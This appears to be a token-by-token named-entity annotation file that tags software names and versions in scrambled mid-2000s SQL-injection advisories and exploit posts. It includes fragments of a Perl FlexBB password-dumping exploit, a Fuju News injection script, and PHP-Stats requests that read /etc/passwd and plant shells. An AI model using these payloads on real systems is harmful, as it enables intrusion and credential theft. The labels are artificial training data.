a O
malicious O
person O
to O
execute O
arbitrary O
PHP O
code O
on O
a O
vulnerable O
system O
. O

Secunia O
Research O
: O
CMS O
Mundo O
SQL O
Injection O
and O
File O
UploadVulnerabilities O

SQL O
injection O
vulnerability O
in O
content.php O
in O
abarcar SN
Realty SN
Portal SN
5.1.5 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
cat O
parameter O
. O

SQL O
injection O
vulnerability O
in O
sessions.inc O
in O
PHP SN
Base SN
Library SN
( O
PHPLib SN
) O
before SV
7.4a SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
variable O
, O
which O
is O
set O
by O
a O
client O
through O
a O
query O
string O
or O
a O
cookie O
. O

SQL O
injection O
vulnerability O
in O
misc.php O
in O
Woltlab SN
Burning SN
Board SN
( O
WBB SN
) O
2.3.4 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
sid O
parameter O
. O

Discovery O
By O
: O
CrAzY O
CrAcKeR O
Site O
: O
I O
want O
to O
thank O
my O
friend O
: O
- O
nono225-mHOn-rageh-LoverHacker O
Breeeeh-LiNuX_rOOt-BoNy_m-rootshill O
Example O
: O
- O
/misc.php O
action=faq O
sid= O
[ O
SQL O
injection O
] O
Email O
: O
CrAzY.CrAcKeR O
( O
at O
) O
hotmail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O

WBB SN
< SV
v2.3.4 SV
misc.php O
SQL O
injection O
Vulnerability O

SQL O
injection O
vulnerability O
in O
inc/start.php O
in O
FlexBB SN
0.5.5 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
flexbb_username O
COOKIE O
parameter O
. O

index.php O
action=buddypopup O
HTTP/1.1 O
; O
$ O
evildata O
.= O
Host O
: O
$ O
host O
; O
$ O
evildata O
.= O
Accept O
evildata O
.= O
Keep-Alive O
: O
300 O
; O
$ O
evildata O
.= O
Connection O
: O
keep-alive O
; O
$ O
evildata O
.= O
Cookie O
: O
. O
$ O
evilcookie O
. O

Connect O
To O
Server O
Was O
Filed O
) O
; O
DONT O
TRY O
TO O
EDIT O
ME O
$ O
evilcookie O
= O
flexbb_username= O
UNION O
SELECT O
id O
, O
username O
, O
password,4 O
, O
usertype,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9 O
FROM O
flexbb_users O
WHERE O
id=1 O
; O
; O
DONT O
TRY O
TO O
EDIT O
ME O
$ O
evildata O
= O
GET O
. O
$ O
path O
. O

/flexbb O
$ O
sock O
= O
IO O
: O
:Socket O
: O
:INET- O
> O
new O
( O
PeerAddr O
= O
$ O
host O
, O
PeerPort O
= O
80 O
, O
Proto O
= O
tcp O
) O
or O
die O
( O
[ O
! O
] O

; O
print O
$ O
sock O
$ O
evildata O
; O
while O
( O
$ O
ans O
= O
< O
$ O
sock O
> O
) O
{ O
< O
a O
href= O
./admin/index.php O
if O
( O
$ O
ans O
=~ O
m/ O
< O
a O
href= O
. O

! O
/usr/bin/perl O
-w O
FlexBB O
< O
= O
0.5.5 O
( O
/inc/start.php O
_COOKIE O
) O
Remote O
SQL O
ByPass O
Exploit O
, O
Perl O
C0d3 O
Milw0rm O
ID O
: O
- O
D3vil-0x1 O
| O
Devil-00 O
< O
BlackHat O
DONT O
FORGET O
TO O
DO O
YOUR O
CONFIG O
! O
! O

DONT O
FORGET O
TO O
DO O
YOUR O
CONFIG O
! O
! O

) O
< O
/a O
> O
/ O
) O
{ O
print O
Bypass O
[ O
OKAY O
] O
Edit O
your O
cookies O
print O
flexbb_username= O
UNION O
SELECT O
id O
, O
username O
, O
password,4 O
, O
usertype,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9 O
FROM O
flexbb_users O
WHERE O
id=1 O
; O
; O
exit O
milw0rm.com O
[ O
2006-04-17 O
] O

/admin O
/index.php O
> O
( O
. O

use O
IO O
: O
:Socket O
; O
Start O
$ O
host O
= O
127.0.0.1 O
; O
$ O
path O
= O
/flexbb O
; O
_END_ O
$ O
host O
: O
- O
The O
Host O
Name O
Without O
http O
: O
| O
exm O
. O

FlexBB SN
0.5.5 SV
- O
/inc/start.php O
_COOKIE O
SQL O
Bypass O

! O
/usr/bin/perl O
-w O
FlexBB SN
< SV
= SV
0.5.5 SV
( O
/inc/start.php O
_COOKIE O
) O
Remote O
SQL O
ByPass O
Exploit O
, O
Perl O
C0d3 O
Milw0rm O
ID O
D3vil-0x1 O
| O
Devil-00 O
< O
BlackHat O
DONT O
FORGET O
TO O
DO O
YOUR O
CONFIG O
! O
! O

Connect O
To O
Server O
Was O
Filed O
) O
; O
DONT O
TRY O
TO O
EDIT O
ME O
$ O
evilcookie O
= O
flexbb_username= O
UNION O
SELECT O
id O
, O
username O
, O
password,4 O
, O
usertype,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5 O
, O
6,7,8,9 O
FROM O
flexbb_users O
WHERE O
id=1 O
; O
; O
DONT O
TRY O
TO O
EDIT O
ME O
$ O
evildata O
= O
GET O
. O
$ O
path O
. O

) O
< O
/a O
> O
/ O
) O
{ O
print O
Bypass O
[ O
OKAY O
] O
Edit O
your O
cookies O
print O
flexbb_username= O
UNION O
SELECT O
id O
, O
username O
, O
password,4 O
, O
usertype,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5 O
, O
6,7,8,9 O
FROM O
flexbb_users O
WHERE O
id=1 O
; O
; O
exit O
; O
} O
} O

FlexBB SN
0.5.5 SV
Bypass O
Exploit O

SQL O
injection O
vulnerability O
in O
the O
Your_Account O
in O
PHP-Nuke SN
7.8 SV
might O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
user_id O
parameter O
in O
the O
Your_Home O
functionality O
. O

SQL O
injection O
vulnerability O
in O
archiv2.php O
in O
Fuju SN
News SN
1.0 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
ID O
parameter O
. O

admin_sql O
MAIN O
file_array O
= O
file O
( O
$ O
PATH_TO_FILE. O
$ O
GET_VARS.urlencode O
( O
$ O
SQL_INJECTION O
) O
) O
or O
die O
( O
couldn O
t O
open O
host O
! O

do O
not O
change O
$ O
TABLE_PREFIX O
. O

848484 O
> O
< O
tdalign=leftvalign=topbgcolor= O
49535C O
> O
< O
divalign= O
center O
> O
< O
fontclass= O
content O
. O

> O
< O
spanclass= O
Stil2 O
span O
> O
! O

< O
br O
; O
} O
echo O
< O
br O
> O
< O
br O
> O
< O
br O
> O
< O
br O
> O
< O
br O
< O
br O
exploit O
: O
fuju SN
news SN
1.0 SV
remote O
sql O
injection O
< O
br O
release O
: O
2006-04-16 O
< O
br O
author O
: O
snatcher O
[ O
snatcher O
at O
gmx.ch O
] O
< O
br O
; O
function O
str_castrate O
( O
$ O
string O
) O
{ O
$ O
string O
= O
str_replace O
string O
) O
; O
$ O
string O
= O
str_replace O
string O
) O
; O
$ O
string O
= O
str_replace O
string O
) O
; O
return O
$ O
string O
; O
} O

greets O
: O
honkey O
, O
str0ke O
< O
- O
good O
exploit O
publisher O
: O
) O
, O
all O
security O
guys O
and O
coders O
over O
the O
world O
terms O
of O
use O
: O
this O
exploit O
is O
just O
for O
educational O
purposes O
, O
do O
not O
use O
it O
for O
illegal O
acts O
. O

, O
$ O
html_content O
, O
$ O
username O
) O
; O
gets O
username O
preg_match_all O
( O
! O
Kategorie O
: O
< O
/span O
> O
< O
/strong O
> O
< O
/p O
> O
< O
/div O
> O
< O
/td O
> O
< O
/tr O
> O
< O
trbordercolorlight= O
2E2E2E O
bordercolordark= O
. O

, O
$ O
html_content O
, O
$ O
password O
) O
; O
gets O
password O
if O
( O
$ O
username O
password O
) O
{ O
echo O
username O
: O
< O
b O
. O
$ O
username O
. O

with O
a O
union O
operator O
. O

title O
: O
fuju SN
news SN
1.0 SV
restriction O
bypass O
edit_kategorie.php O
- O
line O
19 O
$ O
authorized= O
$ O
HTTP_COOKIE_VARS O
[ O
authorized O
] O
; O
that O
the O
mistake O
of O
the O
code O
. O

CONFIGURATION O
PATH_TO_FILE O
in O
example O
default O
: O
empty O
$ O
GET_VARS O
= O
ID O
do O
not O
change O
$ O
SQL_INJECTION O
= O
-666 O
union O
select O
pw,0,0 O
, O
benutzer,0,0 O
, O
pw O
from O
. O

) O
; O
foreach O
( O
$ O
file_array O
as O
$ O
now O
) O
$ O
html_content O
.= O
$ O
now O
; O
$ O
html_content O
= O
str_castrate O
( O
$ O
html_content O
) O
; O
preg_match_all O
( O
! O
Autor O
: O
< O
/span O
> O
< O
/strong O
> O
< O
/td O
> O
< O
/tr O
> O
< O
trbordercolorlight= O
2E2E2E O
bordercolordark= O
848484 O
> O
. O

< O
/b O
; O
} O
else O
{ O
echo O
exploit O
failed O
! O

archiv2.php O
- O
line O
25 O
$ O
result1 O
= O
@ O
mysql_query O
( O
SELECT O
FROM O
news_sql O
WHERE O
ID O
LIKE O
$ O
ID O
) O
; O
because O
this O
$ O
ID O
isn O
t O
escaped O
correctly O
you O
can O
insert O
malicious O
sql O
code O
, O
i.e O
. O

you O
only O
have O
to O
create O
a O
session O
cookie O
named O
authorized O
with O
the O
value O
1 O
, O
and O
you O
are O
logged O
in O
. O

< O
/b O
> O
< O
br O
; O
echo O
password O
: O
< O
b O
. O
$ O
password O
. O

milw0rm.com O
[ O
2006-04-16 O
] O

< O
php O
xc2 O
xaf O
xc2 O
xaf O
Internet O
Security O
title O
: O
fuju SN
news SN
1.0 SV
remote O
sql O
injection O
release O
: O
2006-04-16 O
author O
: O
snatcher O
[ O
snatcher O
at O
gmx.ch O
] O
country O
: O
switzerland O
|+| O
application O
: O
Fuju SN
News SN
1.0 SV
description O
: O
a O
php O
mysql O
based O
newsscript O
download O
: O
description O
: O
you O
can O
get O
the O
password O
with O
a O
simple O
sql O
injection O
. O

< O
tdalign=leftvalign=topbgcolor= O
49535C O
> O
< O
divalign= O
center O
> O
< O
spanclass= O
Stil2 O
div O
> O
! O

Fuju SN
News SN
1.0 SV
- O
Authentication O
Bypass O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
the O
display O
function O
in O
the O
Topics O
for O
MAXdev SN
MDPro SN
( O
MD-Pro SN
) O
1.0.73 SV
and SV
1.0.72 SV
, O
and SV
possibly SV
other SV
versions SV
before SV
1.076 SV
, O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
topicid O
parameter O
in O
a O
display O
action O
, O
which O
is O
not O
properly O
handled O
in O
PNuserapi.PHP O
. O

Full O
Path O
disclosure O
This O
hole O
is O
caused O
by O
direct O
access O
to O
file O
includes/legacy.php O
not O
protected O
PoC O
: O
Fix O
: O
Turn O
off O
display O
error O
in O
php.ini O
can O
fix O
this O
security O
issue O
Blind O
sql O
inject O
This O
hole O
is O
caused O
by O
filtered O
script O
not O
implemented O
to O
$ O
topicid O
variable O
in O
file O
modules/Topics/pnuserapi.php O
PoC O
: O
AND O
1=0 O
AND O
1=1 O
Fix O
: O
Maxdev O
cms O
have O
a O
filtered O
script O
to O
protect O
all O
request O
but O
i O
m O
so O
lazy O
to O
analyze O
the O
code O
, O
then O
i O
just O
add O
this O
code O
in O
modules/Topics/pnuserapi.php O
if O
( O
isset O
( O
$ O
_GET O
[ O
topicid O
topicid= O
$ O
_GET O
[ O
topicid O
] O
; O
validate O
( O
$ O
topicid O
) O
; O
} O
function O
validate O
( O
$ O
char O
) O
{ O
if O
( O
! O
is_numeric O
( O
$ O
char O
) O
) O
{ O
die O
( O
i O
have O
received O
an O
error O
request O

MAXDEV O
CMS O
Multiple O
vulnerabilities O

This O
was O
addressed O
some O
time O
ago O
now O
, O
please O
refer O
to O
: O
Thanks O

Re O
: O
MAXDEV O
CMS O
Multiple O
vulnerabilities O

SQL O
injection O
vulnerability O
in O
viewStatement.php O
in O
AdMan SN
1.0.20051221 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
transactions_offset O
parameter O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
PHP-Stats SN
0.1.9.1 SV
and SV
earlier SV
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
( O
1 O
) O
the O
option O
[ O
prefix O
] O
parameter O
in O
admin.php O
and O
other O
unspecified O
PHP O
scripts O
, O
and O
( O
2 O
) O
the O
PC_REMOTE_ADDR O
HTTP O
header O
to O
click.php O
. O

Poc O
exploit O
here O
: O
ii O
) O
vulnerable O
code O
in O
click.php O
at O
line O
18 O
: O
... O
if O
( O
isset O
( O
$ O
_SERVER O
[ O
REMOTE_ADDR O
ip= O
( O
isset O
( O
$ O
_SERVER O
[ O
HTTP_PC_REMOTE_ADDR O
] O
) O

$ O
_SERVER O
[ O
HTTP_PC_REMOTE_ADDR O
SERVER O
[ O
REMOTE_ADDR O
and O
line O
65 O
result=sql_query O
( O
SELECT O
visitor_id O
FROM O
$ O
option O
[ O
prefix O
] O
_cache O
WHERE O
user_id= O
$ O
ip O
LIMIT O
1 O
you O
can O
inject O
sql O
commands O
through O
PC_REMOTE_ADDR O
http O
header O
, O
poc O
: O
GET O
[ O
path O
] O
click.php O
id=1 O
& O
get=1 O
HTTP/1.1 O
PC_REMOTE_ADDR O
: O
UNION O
SELECT O
[ O
code O
] O
INTO O
OUTFILE O
hell.php O
FROM O
php_stats_cache O
Host O
: O
[ O
host O
] O
Connection O
: O
Close O
iii O
) O
information O
disclosure O
, O
you O
can O
go O
to O
: O
to O
see O
at O
screen O
database O
table_prefix O
, O
making O
easier O
the O
exploitation O
process O
... O
rgod O
site O
: O
mail O
: O
rgod O
at O
autistici.org O
original O
advisory O
: O

PHP-Stats SN
< SV
= SV
0.1.9.1 SV
remote O
commands O
execution O
software O
: O
site O
: O
description O
: O
Open O
source O
statistical O
package O
for O
PHP O
enabled O
web O
sites O
i O
) O
vulnerable O
code O
in O
admin.php O
( O
and O
in O
nearly O
every O
scripts O
... O
) O
at O
line O
65 O
: O
... O
if O
( O
isset O
( O
$ O
_POST O
[ O
option O
while O
( O
list O
( O
$ O
key O
, O
$ O
value O
) O
= O
each O
( O
$ O
tmpOption O
) O
) O
$ O
option O
[ O
$ O
key O
] O
= O
$ O
value O
you O
can O
overwrite O
at O
run-time O
the O
option O
[ O
] O
array O
... O
, O
raising O
SQL O
injection O
, O
arbitrary O
local O
inclusion O
and O
php O
injection O
issues O
, O
poc O
: O
i.a O
) O
arbitrary O
local O
inclusion O
( O
with O
magic_quotes_gpc O
off O
) O
: O
i.a1 O
) O
POST O
[ O
path O
] O
admin.php O
do=0 O
HTTP/1.1 O
; O
Content-Type O
: O
application/x-www-form-urlencoded O
Host O
: O
[ O
somehost O
] O
Content-Length O
: O
[ O
data_length O
] O
Connection O
: O
Close O
option= O
& O
option O
[ O
clear_cache O
] O
=1 O
& O
option O
[ O
language O
etc/pas O
swd O
[ O
null O
char O
] O
i.a2 O
) O
POST O
[ O
path O
] O
admin.php O
do=0 O
HTTP/1.1 O
; O
Content-Type O
: O
application/x-www-form-urlencoded O
Host O
: O
[ O
somehost O
] O
Content-Length O
: O
[ O
data_length O
] O
Connection O
: O
Close O
option= O
& O
option O
[ O
template O
etc/passwd O
[ O
null O
char O
] O
i.b O
) O
SQL O
injection O
- O
you O
can O

Now O
you O
can O
inject O
a O
shell O
in O
two O
different O
ways O
by O
administrative O
features O
, O
poc O
: O
i.c1 O
) O
POST O
[ O
path O
] O
admin.php O
action=esclusioni O
& O
opzioni=excfol O
HTTP/1.1 O
Content-Type O
: O
application/x-www-form-urlencoded O
Cookie O
: O
php_stats_cache=1 O
; O
pass_cookie= O
[ O
md5 O
hash O
of O
suntzu O
] O
Host O
: O
[ O
somehost O
] O
Content-Length O
: O
[ O
data_length O
] O
Connection O
: O
Close O
option= O
& O
option O
[ O
admin_pass O
] O
=suntzu O
& O
option_new= O
[ O
SHELL O
] O
now O
you O
can O
launch O
commands O
including O
option/php-stats-options.php O
script O
, O
poc O
: O
POST O
[ O
path O
] O
admin.php O
cmd=netstat O
% O
20-ano O
& O
do=0 O
HTTP/1.1 O
Content-Type O
: O
application/x-www-form-urlencoded O
Host O
: O
[ O
somehost O
] O
Content-Length O
: O
[ O
data_length O
] O
Connection O
: O
Close O
option= O
& O
option O
[ O
language O
] O
=../option/php-stats-options.php O
[ O
null O
char O
] O
i.c2 O
) O
the O
most O
chritical O
, O
this O
works O
regardless O
of O
any O
php.ini O
settings O
, O
you O
can O
inject O
a O
shell O
in O
config.php O
and O
launch O
commands O
from O
it O
. O

PHP-Stats SN
< SV
= SV
0.1.9.1 SV
remote O
commands O
execution O

Bug O
patched O
with O
version O
0.1.9.1b O
downloable O
from O

Re O
: O
PHP-Stats SN
< SV
= SV
0.1.9.1 SV
remote O
commands O
execution O

All O
bug O
was O
fixed O
in O
0.1.9.1b O

SQL O
injection O
vulnerability O
in O
include/includes/user/login.php O
in O
ilchClan SN
before SV
1.05g SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
login_name O
parameter O
. O

SQL O
injection O
vulnerability O
in O
the O
NS-Languages O
for O
PostNuke SN
0.761 SV
and SV
earlier SV
, O
when O
magic_quotes_gpc O
is O
off O
, O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
language O
parameter O
to O
admin.php O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
Calendarix O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
( O
1 O
) O
the O
catview O
parameter O
in O
cal_functions.inc.php O
and O
( O
2 O
) O
the O
login O
parameter O
in O
cal_login.php O
. O

NOTE O
: O
the O
catview O
vector O
might O
overlap O
CVE-2005-1865 O
. O

Condition O
for O
Authentication O
bypass O
: O
gpc_magic_quotes O
- O
off O
Exploit O
Available O
at O
: O
Solution O
No O
Patch O
available O
. O

This O
can O
be O
used O
to O
make O
any O
SQL O
query O
by O
injecting O
arbitrary O
SQL O
code O
. O

New O
eVuln O
Advisory O
: O
Calendarix O
SQL O
Injection O
& O
Authorization O
Bypass O
Vulnerabilities O
Summary O
Software O
: O
Calendarix O
Sowtware O
Web O
Site O
: O
Versions O
: O
0.6.20050830 SV
Critical O
Level O
: O
Moderate O
Type O
: O
SQL O
Injection O
Class O
: O
Remote O
Status O
: O
Unpatched O
Exploit O
: O
Available O
Solution O
: O
Not O
Available O
Discovered O
by O
: O
Aliaksandr O
Hartsuyeu O
( O
eVuln.com O
) O
eVuln O
ID O
: O
EV0052 O
Description O

Authentication O
bypass O
is O
possible O
. O

Credit O
Discovered O
by O
: O
Aliaksandr O
Hartsuyeu O
( O
eVuln.com O
) O

Vulnerable O
scripts O
: O
cal_functions.inc.php O
admin/cal_login.php O
Variables O
$ O
catview O
( O
cal_functions.inc.php O
) O
$ O
login O
( O
admin/cal_login.php O
) O
isn O
t O
properly O
sanitized O
before O
being O
used O
in O
a O
SQL O
query O
. O

[ O
eVuln O
] O
Calendarix O
SQL O
Injection O
& O
Authorization O
Bypass O
Vulnerabilities O

Multiple O
SQL O
injection O
vulnerabilities O
in O
list.php O
in O
Complete O
PHP O
Counter O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
c O
or O
( O
2 O
) O
s O
parameter O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
OcoMon SN
1.20 SV
, O
and SV
possibly SV
earlier SV
versions SV
, O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
unknown O
attack O
vectors O
in O
an O
unspecified O
input O
form O
, O
a O
different O
vulnerability O
than O
CVE-2005-4664 O
. O

SQL O
injection O
vulnerability O
in O
pafiledb.php O
in O
PHP SN
Arena SN
paFileDB SN
Extreme SV
Edition SV
RC SV
5 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
newsid O
and O
( O
2 O
) O
id O
parameter O
. O

SQL O
injection O
vulnerability O
in O
view.php O
in O
Hobosworld SN
HobSR SN
1.0 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
arrange O
and O
( O
2 O
) O
p O
parameters O
. O

SQL O
injection O
vulnerability O
in O
index.php O
in O
Entergal SN
MX SN
2.0 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
idcat O
parameter O
in O
a O
showcat O
action O
and O
( O
2 O
) O
the O
action O
parameter O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
index.php O
in O
DMANews SN
0.904 SV
and SV
0.910 SV
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
id O
parameter O
in O
a O
comments O
action O
and O
the O
( O
2 O
) O
sortorder O
and O
( O
3 O
) O
display_num O
parameters O
in O
a O
news_list O
action O
. O

SQL O
injection O
vulnerability O
in O
themes/kategorie/index.php O
in O
Randshop O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
kategorieid O
and O
( O
2 O
) O
katid O
parameters O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
the O
Search O
in O
PHP-Nuke SN
7.8 SV
, O
and SV
possibly SV
other SV
versions SV
before SV
7.9 SV
with SV
patch SV
3.1 SV
, O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
, O
as O
demonstrated O
via O
the O
query O
parameter O
in O
a O
stories O
type O
. O

Or O
patch O
manually O
that O
flawed O
codeline O
. O

Versions O
7.5 SV
- SV
7.8 SV
are O
affected O
, O
older O
versions O
contain O
different O
code O
implementation O
and O
are O
not O
affected O
by O
bug O
. O

Now O
let O
peek O
at O
the O
same O
code O
fragment O
in O
newer O
phpnuke O
version O
, O
in O
this O
specific O
case O
- O
7.5 O
: O
[ O
from O
source O
code O
] O
$ O
query O
= O
stripslashes O
( O
check_html O
( O
$ O
query O
, O
nohtml O
) O
) O
; O
if O
( O
$ O
type O
stories O
OR O
! O
$ O
type O
) O
{ O
if O
( O
$ O
category O
0 O
) O
{ O
$ O
categ O
= O
AND O
catid= O
$ O
category O
else O
{ O
$ O
categ O
q O
= O
select O
s.sid O
, O
s.aid O
, O
s.informant O
, O
s.title O
, O
s.time O
, O
s.hometext O
, O
s.bodytext O
, O
a.url O
, O
s.comments O
, O
s.topic O
from O
. O
$ O
prefix O
. O

Greetings O
Greetz O
to O
LINUX O
, O
Heintz O
, O
y3dips O
, O
shai-tan O
, O
slimjim100 O
, O
zer0-c00l O
and O
all O
other O
active O
members O
from O
waraxe O
forum O
! O

But O
the O
truth O
is O
, O
that O
very O
big O
hole O
to O
phpnuke O
installation O
is O
opened O
and O
it O
exists O
in O
versions O
7.5 O
, O
7.6 O
, O
7.7 O
and O
7.8 O
; O
) O
So O
- O
is O
this O
exploitable O

Example O
proof O
of O
concept O
exploit O

_authors O
a O
where O
s.aid=a.aid O
$ O
queryalang O
$ O
categ O
; O
if O
( O
isset O
( O
$ O
query O
) O
) O
$ O
q O
.= O
AND O
( O
s.title O
LIKE O
% O
$ O
query O
% O
OR O
s.hometext O
LIKE O
% O
$ O
query O
% O
OR O
s.bodytext O
LIKE O
% O
$ O
query O
% O
OR O
s.notes O
LIKE O
% O
$ O
query O
if O
( O
$ O
author O
q O
.= O
AND O
s.aid= O
$ O
author O
from O
source O
code O
] O
As O
we O
can O
see O
, O
addslashes O
( O
) O
is O
used O
against O
$ O
query O
variable O
, O
so O
sql O
injection O
is O
not O
possible O
. O

Details O
Let O
start O
by O
looking O
at O
modules/Search/index.php O
code O
in O
older O
nuke O
versions O
, O
in O
this O
example O
, O
7.1 O
: O
[ O
from O
source O
code O
] O
$ O
query O
= O
addslashes O
( O
$ O
query O
) O
; O
if O
( O
$ O
type O
stories O
OR O
! O
$ O
type O
) O
{ O
if O
( O
$ O
category O
0 O
) O
{ O
$ O
categ O
= O
AND O
catid= O
$ O
category O
; O
} O
elseif O
( O
$ O
category O
0 O
) O
{ O
$ O
categ O
q O
= O
select O
s.sid O
, O
s.aid O
, O
s.informant O
, O
s.title O
, O
s.time O
, O
s.hometext O
, O
s.bodytext O
, O
a.url O
, O
s.comments O
, O
s.topic O
from O
. O
$ O
prefix O
. O

Vulnerabilities O
This O
particular O
advisory O
will O
address O
critical O
sql O
injection O
case O
in O
Search O
module O
. O

waraxe-2006-SA O
046 O
Critical O
sql O
injection O
in O
phpNuke SN
7.5-7.8 SV
Author O
: O
Janek O
Vind O
waraxe O
Date O
: O
19 O
. O

PHP-Nuke O
is O
a O
news O
automated O
system O
specially O
designed O
to O
be O
used O
in O
Intranets O
and O
Internet O
. O

Newest O
version O
7.9 SV
is O
not O
vulnerable O
too O
. O

Only O
the O
first O
line O
: O
$ O
query O
= O
stripslashes O
( O
check_html O
( O
$ O
query O
, O
nohtml O
) O
) O
; O
Well O
, O
i O
really O
don O
t O
know O
, O
what O
was O
thinking O
the O
person O
, O
who O
changed O
this O
little O
code O
snippet O
. O

Additional O
resources O
DX O
expeditions O
database O
- O
HDD O
data O
recovery O
- O
Contact O
come2waraxe O
( O
at O
) O
yahoo O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
Janek O
Vind O
waraxe O
Homepage O
: O
[ O
EOF O
] O

Raido O
Kerna O
- O
tervitused O
! O

February O
2006 O
Location O
: O
Estonia O
, O
Tartu O
Web O
: O
Target O
software O
description O
phpNuke SN
7.5 SV
- SV
7.8 SV
Homepage O
: O
What O
is O
phpNuke O

_authors O
a O
where O
s.aid=a.aid O
$ O
queryalang O
$ O
categ O
; O
if O
( O
isset O
( O
$ O
query O
) O
) O
$ O
q O
.= O
AND O
( O
s.title O
LIKE O
% O
$ O
query O
% O
OR O
s.hometext O
LIKE O
% O
$ O
query O
% O
OR O
s.bodytext O
LIKE O
% O
$ O
query O
% O
OR O
s.notes O
LIKE O
% O
$ O
query O
if O
( O
$ O
author O
q O
.= O
AND O
s.aid= O
$ O
author O
from O
source O
code O
] O
Any O
difference O

_stories O
s O
, O
. O
$ O
prefix O
. O

The O
Administrator O
has O
total O
control O
of O
his O
web O
site O
, O
registered O
users O
, O
and O
he O
will O
have O
in O
the O
hand O
a O
powerful O
assembly O
of O
tools O
to O
maintain O
an O
active O
and O
100 O
% O
interactive O
web O
site O
using O
databases O
. O

[ O
waraxe-2006-SA O
046 O
] O
- O
Critical O
sql O
injection O
in O
phpNuke SN
7.5-7.8 SV

SecurityReason O
Note O
: O
The O
adv O
was O
posted O
on O
: O
15.11.2005 O
Exploit O
for O
this O
issue O
also O
was O
realised O
: O
And O
the O
fix O
too O
: O
More O
informations O
: O
CVE O
: O
CAN-2005-3792 O
or O
CVE-2005-3792 O
This O
issue O
was O
not O
documented O
on O
becuse O
you O
didn O
t O
found O
it O
on O
the O
List O
. O

Re O
: O
[ O
waraxe-2006-SA O
046 O
] O
- O
Critical O
sql O
injection O
in O
phpNuke SN
7.5-7.8 SV

SQL O
injection O
vulnerability O
in O
article.asp O
in O
unknown O
versions O
of O
aspnuke O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
articleid O
parameter O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
PROMS SN
before SV
0.11 SV
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
unknown O
vectors O
. O

SQL O
injection O
vulnerability O
in O
modules.php O
in O
NukeCalendar SN
1.1.a SV
, O
as O
used O
in O
PHP-Nuke O
, O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
eid O
parameter O
. O

Demarc SN
PureSecure SN
1.05 SV
allows O
remote O
attackers O
to O
gain O
administrative O
privileges O
via O
a O
SQL O
injection O
attack O
in O
a O
session O
ID O
that O
is O
stored O
in O
the O
s_key O
cookie O
. O
